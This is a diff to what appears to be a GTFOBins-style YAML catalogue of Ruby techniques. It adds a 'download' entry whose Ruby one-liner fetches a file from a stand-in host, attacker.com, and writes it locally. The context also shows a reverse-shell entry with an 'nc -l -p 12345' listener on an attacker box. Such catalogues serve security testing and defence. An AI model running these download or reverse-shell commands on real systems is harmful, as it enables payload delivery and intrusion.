@@ -9,6 +9,14 @@ functions:
       code: |
         export LPORT=8888
         ruby -run -e httpd . -p $LPORT
+  download:
+    - description: Fetch a remote file via HTTP GET request.
+      code: |
+        export RHOST=attacker.com
+        export RPORT=12345
+        export RFILE=/file_to_get
+        export LFILE=file_to_save
+        ruby -e 'require "net/http"; Net::HTTP.start(ENV["RHOST"], ENV["RPORT"]) { |http| r = http.get(ENV["RFILE"]); open(ENV["LFILE"], "wb") { |file| file.write(r.body) } }'
   reverse-shell-interactive:
     - description: Run `nc -l -p 12345` on the attacker box to receive the shell.
       code: |
